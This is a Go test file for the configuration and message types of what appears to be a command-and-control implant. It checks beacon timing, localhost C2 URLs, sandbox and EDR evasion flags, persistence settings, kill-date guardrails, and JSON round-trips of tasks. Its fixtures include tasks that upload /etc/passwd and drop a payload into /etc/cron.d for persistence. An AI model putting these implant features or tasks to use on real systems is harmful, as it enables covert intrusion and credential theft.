package config

import (
	"encoding/json"
	"testing"
	"time"
)

func TestDefaultConfig(t *testing.T) {
	t.Run("returns non-nil", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg == nil {
			t.Fatal("DefaultConfig() returned nil")
		}
	})

	t.Run("beacon interval is positive", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.CallbackInterval <= 0 {
			t.Errorf("CallbackInterval = %v, want > 0", cfg.CallbackInterval)
		}
	})

	t.Run("beacon interval default is 30s", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.CallbackInterval != 30*time.Second {
			t.Errorf("CallbackInterval = %v, want 30s", cfg.CallbackInterval)
		}
	})

	t.Run("jitter is between 0 and 1", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.Jitter < 0 || cfg.Jitter > 1 {
			t.Errorf("Jitter = %v, want in [0, 1]", cfg.Jitter)
		}
	})

	t.Run("jitter default is 0.2", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.Jitter != 0.2 {
			t.Errorf("Jitter = %v, want 0.2", cfg.Jitter)
		}
	})

	t.Run("C2Servers not empty", func(t *testing.T) {
		cfg := DefaultConfig()
		if len(cfg.C2Servers) == 0 {
			t.Error("C2Servers is empty, want at least one server")
		}
	})

	t.Run("C2Servers default contains expected URL", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.C2Servers[0] != "https://127.0.0.1:8443/api/v1/beacon" {
			t.Errorf("C2Servers[0] = %q, want %q", cfg.C2Servers[0], "https://127.0.0.1:8443/api/v1/beacon")
		}
	})

	t.Run("DNSDomains populated", func(t *testing.T) {
		cfg := DefaultConfig()
		if len(cfg.DNSDomains) == 0 {
			t.Error("DNSDomains is empty, want at least one domain")
		}
	})

	t.Run("DoHResolvers populated", func(t *testing.T) {
		cfg := DefaultConfig()
		if len(cfg.DoHResolvers) == 0 {
			t.Error("DoHResolvers is empty, want at least one resolver")
		}
	})

	t.Run("MaxRetries is positive", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.MaxRetries <= 0 {
			t.Errorf("MaxRetries = %d, want > 0", cfg.MaxRetries)
		}
	})

	t.Run("ImplantID is non-empty", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.ImplantID == "" {
			t.Error("ImplantID is empty, want non-empty hex string")
		}
	})

	t.Run("ImplantID is unique per call", func(t *testing.T) {
		cfg1 := DefaultConfig()
		cfg2 := DefaultConfig()
		if cfg1.ImplantID == cfg2.ImplantID {
			t.Errorf("ImplantID is not unique: both = %q", cfg1.ImplantID)
		}
	})

	t.Run("TargetHostname is set", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.TargetHostname == "" {
			t.Error("TargetHostname is empty, want non-empty")
		}
	})

	t.Run("MountWorkDir is set", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.MountWorkDir == "" {
			t.Error("MountWorkDir is empty, want non-empty")
		}
	})

	t.Run("MasqueradeName is set", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.MasqueradeName == "" {
			t.Error("MasqueradeName is empty, want non-empty")
		}
	})

	t.Run("PersistMethods populated", func(t *testing.T) {
		cfg := DefaultConfig()
		if len(cfg.PersistMethods) == 0 {
			t.Error("PersistMethods is empty, want at least one method")
		}
	})

	t.Run("SandboxEvasion enabled by default", func(t *testing.T) {
		cfg := DefaultConfig()
		if !cfg.SandboxEvasion {
			t.Error("SandboxEvasion = false, want true")
		}
	})

	t.Run("EDRAwareness enabled by default", func(t *testing.T) {
		cfg := DefaultConfig()
		if !cfg.EDRAwareness {
			t.Error("EDRAwareness = false, want true")
		}
	})
}

func TestGuardrailConfig(t *testing.T) {
	t.Run("KillDate is populated", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.KillDate == "" {
			t.Error("KillDate is empty, want a date string")
		}
	})

	t.Run("KillDate format is valid YYYY-MM-DD", func(t *testing.T) {
		cfg := DefaultConfig()
		_, err := time.Parse("2006-01-02", cfg.KillDate)
		if err != nil {
			t.Errorf("KillDate %q is not valid YYYY-MM-DD: %v", cfg.KillDate, err)
		}
	})

	t.Run("KillDate is approximately 30 days in future", func(t *testing.T) {
		cfg := DefaultConfig()
		killDate, err := time.Parse("2006-01-02", cfg.KillDate)
		if err != nil {
			t.Fatalf("KillDate parse error: %v", err)
		}
		now := time.Now()
		diff := killDate.Sub(now)
		// Allow a window: between 29 and 31 days
		if diff < 29*24*time.Hour || diff > 31*24*time.Hour {
			t.Errorf("KillDate %q is not ~30 days from now (diff = %v)", cfg.KillDate, diff)
		}
	})

	t.Run("KillSwitchProcs populated", func(t *testing.T) {
		cfg := DefaultConfig()
		if len(cfg.KillSwitchProcs) == 0 {
			t.Error("KillSwitchProcs is empty, want at least one entry")
		}
	})

	t.Run("MaxAliveHours default is 0 (unlimited)", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.MaxAliveHours != 0 {
			t.Errorf("MaxAliveHours = %d, want 0 (unlimited)", cfg.MaxAliveHours)
		}
	})
}

func TestBeaconJSONRoundTrip(t *testing.T) {
	t.Run("basic fields survive round-trip", func(t *testing.T) {
		original := Beacon{
			ImplantID: "deadbeef01020304",
			Hostname:  "worker-01",
			Username:  "root",
			UID:       0,
			PID:       1234,
			OS:        "linux",
			Arch:      "amd64",
			InNS:      true,
		}

		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}

		var decoded Beacon
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}

		if decoded.ImplantID != original.ImplantID {
			t.Errorf("ImplantID: got %q, want %q", decoded.ImplantID, original.ImplantID)
		}
		if decoded.Hostname != original.Hostname {
			t.Errorf("Hostname: got %q, want %q", decoded.Hostname, original.Hostname)
		}
		if decoded.Username != original.Username {
			t.Errorf("Username: got %q, want %q", decoded.Username, original.Username)
		}
		if decoded.UID != original.UID {
			t.Errorf("UID: got %d, want %d", decoded.UID, original.UID)
		}
		if decoded.PID != original.PID {
			t.Errorf("PID: got %d, want %d", decoded.PID, original.PID)
		}
		if decoded.OS != original.OS {
			t.Errorf("OS: got %q, want %q", decoded.OS, original.OS)
		}
		if decoded.Arch != original.Arch {
			t.Errorf("Arch: got %q, want %q", decoded.Arch, original.Arch)
		}
		if decoded.InNS != original.InNS {
			t.Errorf("InNS: got %v, want %v", decoded.InNS, original.InNS)
		}
	})

	t.Run("interfaces field survives round-trip", func(t *testing.T) {
		original := Beacon{
			ImplantID: "aabbccdd",
			Interfaces: []NetInfo{
				{Name: "eth0", Addrs: []string{"192.168.1.10/24"}, MAC: "aa:bb:cc:dd:ee:ff"},
				{Name: "lo", Addrs: []string{"127.0.0.1/8"}, MAC: "00:00:00:00:00:00"},
			},
		}

		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}

		var decoded Beacon
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}

		if len(decoded.Interfaces) != len(original.Interfaces) {
			t.Fatalf("Interfaces len: got %d, want %d", len(decoded.Interfaces), len(original.Interfaces))
		}
		for i, iface := range decoded.Interfaces {
			if iface.Name != original.Interfaces[i].Name {
				t.Errorf("Interfaces[%d].Name: got %q, want %q", i, iface.Name, original.Interfaces[i].Name)
			}
			if iface.MAC != original.Interfaces[i].MAC {
				t.Errorf("Interfaces[%d].MAC: got %q, want %q", i, iface.MAC, original.Interfaces[i].MAC)
			}
			if len(iface.Addrs) != len(original.Interfaces[i].Addrs) {
				t.Errorf("Interfaces[%d].Addrs len: got %d, want %d", i, len(iface.Addrs), len(original.Interfaces[i].Addrs))
			}
		}
	})

	t.Run("results field survives round-trip", func(t *testing.T) {
		original := Beacon{
			ImplantID: "aabbccdd",
			Results: []*TaskResult{
				{
					ID:        "task-001",
					ImplantID: "aabbccdd",
					Output:    []byte("hello world"),
					Timestamp: 1700000000,
				},
			},
		}

		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}

		var decoded Beacon
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}

		if len(decoded.Results) != 1 {
			t.Fatalf("Results len: got %d, want 1", len(decoded.Results))
		}
		r := decoded.Results[0]
		if r.ID != "task-001" {
			t.Errorf("Results[0].ID: got %q, want %q", r.ID, "task-001")
		}
		if string(r.Output) != "hello world" {
			t.Errorf("Results[0].Output: got %q, want %q", string(r.Output), "hello world")
		}
		if r.Timestamp != 1700000000 {
			t.Errorf("Results[0].Timestamp: got %d, want %d", r.Timestamp, 1700000000)
		}
	})

	t.Run("omitempty fields absent when zero", func(t *testing.T) {
		b := Beacon{ImplantID: "test"}
		data, err := json.Marshal(b)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}

		var raw map[string]interface{}
		if err := json.Unmarshal(data, &raw); err != nil {
			t.Fatalf("json.Unmarshal raw failed: %v", err)
		}
		if _, ok := raw["interfaces"]; ok {
			t.Error("interfaces key present when Interfaces is nil, want omitted")
		}
		if _, ok := raw["results"]; ok {
			t.Error("results key present when Results is nil, want omitted")
		}
	})
}

func TestBeaconResponseJSONRoundTrip(t *testing.T) {
	t.Run("full response survives round-trip", func(t *testing.T) {
		original := BeaconResponse{
			Tasks: []Task{
				{ID: "t1", Type: "shell", Args: map[string]string{"cmd": "id"}},
				{ID: "t2", Type: "sleep", Args: map[string]string{"seconds": "60"}},
			},
			Sleep:    120,
			Jitter:   0.3,
			Shutdown: false,
		}

		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}

		var decoded BeaconResponse
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}

		if len(decoded.Tasks) != len(original.Tasks) {
			t.Fatalf("Tasks len: got %d, want %d", len(decoded.Tasks), len(original.Tasks))
		}
		if decoded.Sleep != original.Sleep {
			t.Errorf("Sleep: got %d, want %d", decoded.Sleep, original.Sleep)
		}
		if decoded.Jitter != original.Jitter {
			t.Errorf("Jitter: got %v, want %v", decoded.Jitter, original.Jitter)
		}
		if decoded.Shutdown != original.Shutdown {
			t.Errorf("Shutdown: got %v, want %v", decoded.Shutdown, original.Shutdown)
		}
	})

	t.Run("shutdown flag round-trips true", func(t *testing.T) {
		original := BeaconResponse{Shutdown: true}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded BeaconResponse
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if !decoded.Shutdown {
			t.Error("Shutdown: got false, want true")
		}
	})

	t.Run("empty tasks field omitted", func(t *testing.T) {
		resp := BeaconResponse{Sleep: 60}
		data, err := json.Marshal(resp)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var raw map[string]interface{}
		if err := json.Unmarshal(data, &raw); err != nil {
			t.Fatalf("json.Unmarshal raw failed: %v", err)
		}
		if _, ok := raw["tasks"]; ok {
			t.Error("tasks key present when Tasks is nil, want omitted")
		}
	})

	t.Run("tasks field works with multiple entries", func(t *testing.T) {
		tasks := []Task{
			{ID: "a", Type: "shell", Args: map[string]string{"cmd": "whoami"}},
			{ID: "b", Type: "upload", Args: map[string]string{"path": "/etc/passwd"}},
			{ID: "c", Type: "exit", Args: nil},
		}
		original := BeaconResponse{Tasks: tasks}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded BeaconResponse
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if len(decoded.Tasks) != 3 {
			t.Fatalf("Tasks len: got %d, want 3", len(decoded.Tasks))
		}
		for i, task := range decoded.Tasks {
			if task.ID != tasks[i].ID {
				t.Errorf("Tasks[%d].ID: got %q, want %q", i, task.ID, tasks[i].ID)
			}
			if task.Type != tasks[i].Type {
				t.Errorf("Tasks[%d].Type: got %q, want %q", i, task.Type, tasks[i].Type)
			}
		}
	})
}

func TestTaskJSONRoundTrip(t *testing.T) {
	t.Run("shell task", func(t *testing.T) {
		original := Task{
			ID:   "task-shell-01",
			Type: "shell",
			Args: map[string]string{"cmd": "uname -a"},
		}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded Task
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if decoded.ID != original.ID {
			t.Errorf("ID: got %q, want %q", decoded.ID, original.ID)
		}
		if decoded.Type != original.Type {
			t.Errorf("Type: got %q, want %q", decoded.Type, original.Type)
		}
		if decoded.Args["cmd"] != original.Args["cmd"] {
			t.Errorf("Args[cmd]: got %q, want %q", decoded.Args["cmd"], original.Args["cmd"])
		}
	})

	t.Run("upload task with multiple args", func(t *testing.T) {
		original := Task{
			ID:   "task-upload-02",
			Type: "upload",
			Args: map[string]string{
				"src":  "/tmp/payload",
				"dest": "/etc/cron.d/update",
				"mode": "0755",
			},
		}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded Task
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if len(decoded.Args) != len(original.Args) {
			t.Errorf("Args len: got %d, want %d", len(decoded.Args), len(original.Args))
		}
		for k, v := range original.Args {
			if decoded.Args[k] != v {
				t.Errorf("Args[%q]: got %q, want %q", k, decoded.Args[k], v)
			}
		}
	})

	t.Run("task with nil args", func(t *testing.T) {
		original := Task{
			ID:   "task-exit-03",
			Type: "exit",
			Args: nil,
		}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded Task
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if decoded.ID != original.ID {
			t.Errorf("ID: got %q, want %q", decoded.ID, original.ID)
		}
		if decoded.Type != original.Type {
			t.Errorf("Type: got %q, want %q", decoded.Type, original.Type)
		}
	})

	t.Run("task with empty args map", func(t *testing.T) {
		original := Task{
			ID:   "task-noop-04",
			Type: "noop",
			Args: map[string]string{},
		}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded Task
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if decoded.Type != original.Type {
			t.Errorf("Type: got %q, want %q", decoded.Type, original.Type)
		}
	})

	t.Run("JSON keys are correct", func(t *testing.T) {
		task := Task{ID: "x", Type: "shell", Args: map[string]string{"k": "v"}}
		data, err := json.Marshal(task)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var raw map[string]interface{}
		if err := json.Unmarshal(data, &raw); err != nil {
			t.Fatalf("json.Unmarshal raw failed: %v", err)
		}
		for _, key := range []string{"id", "type", "args"} {
			if _, ok := raw[key]; !ok {
				t.Errorf("expected JSON key %q not found", key)
			}
		}
	})
}

func TestTaskResultJSONRoundTrip(t *testing.T) {
	t.Run("full result survives round-trip", func(t *testing.T) {
		original := TaskResult{
			ID:        "task-001",
			ImplantID: "deadbeef",
			Output:    []byte("uid=0(root) gid=0(root)"),
			Error:     "",
			Timestamp: 1700000001,
		}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded TaskResult
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if decoded.ID != original.ID {
			t.Errorf("ID: got %q, want %q", decoded.ID, original.ID)
		}
		if decoded.ImplantID != original.ImplantID {
			t.Errorf("ImplantID: got %q, want %q", decoded.ImplantID, original.ImplantID)
		}
		if string(decoded.Output) != string(original.Output) {
			t.Errorf("Output: got %q, want %q", string(decoded.Output), string(original.Output))
		}
		if decoded.Timestamp != original.Timestamp {
			t.Errorf("Timestamp: got %d, want %d", decoded.Timestamp, original.Timestamp)
		}
	})

	t.Run("error field omitted when empty", func(t *testing.T) {
		result := TaskResult{ID: "t1", ImplantID: "abc", Output: []byte("ok"), Timestamp: 1}
		data, err := json.Marshal(result)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var raw map[string]interface{}
		if err := json.Unmarshal(data, &raw); err != nil {
			t.Fatalf("json.Unmarshal raw failed: %v", err)
		}
		if _, ok := raw["error"]; ok {
			t.Error("error key present when Error is empty, want omitted")
		}
	})

	t.Run("error field survives round-trip when non-empty", func(t *testing.T) {
		original := TaskResult{
			ID:        "task-err",
			ImplantID: "abc",
			Output:    nil,
			Error:     "permission denied",
			Timestamp: 9999,
		}
		data, err := json.Marshal(original)
		if err != nil {
			t.Fatalf("json.Marshal failed: %v", err)
		}
		var decoded TaskResult
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("json.Unmarshal failed: %v", err)
		}
		if decoded.Error != original.Error {
			t.Errorf("Error: got %q, want %q", decoded.Error, original.Error)
		}
	})
}

func TestFieldValidation(t *testing.T) {
	t.Run("beacon interval must be positive", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.CallbackInterval <= 0 {
			t.Errorf("invalid CallbackInterval: %v", cfg.CallbackInterval)
		}
	})

	t.Run("jitter must be between 0 and 1 inclusive", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.Jitter < 0.0 || cfg.Jitter > 1.0 {
			t.Errorf("Jitter %v out of [0, 1]", cfg.Jitter)
		}
	})

	t.Run("C2Servers must not be empty", func(t *testing.T) {
		cfg := DefaultConfig()
		if len(cfg.C2Servers) == 0 {
			t.Error("C2Servers must not be empty")
		}
		for i, s := range cfg.C2Servers {
			if s == "" {
				t.Errorf("C2Servers[%d] is empty string", i)
			}
		}
	})

	t.Run("MaxRetries must be positive", func(t *testing.T) {
		cfg := DefaultConfig()
		if cfg.MaxRetries <= 0 {
			t.Errorf("MaxRetries = %d, want > 0", cfg.MaxRetries)
		}
	})

	t.Run("ImplantID is hex string of expected length", func(t *testing.T) {
		cfg := DefaultConfig()
		// generateID returns hex of 8 bytes = 16 hex chars
		if len(cfg.ImplantID) != 16 {
			t.Errorf("ImplantID length = %d, want 16", len(cfg.ImplantID))
		}
		for _, c := range cfg.ImplantID {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
				t.Errorf("ImplantID %q contains non-hex character %q", cfg.ImplantID, c)
				break
			}
		}
	})
}
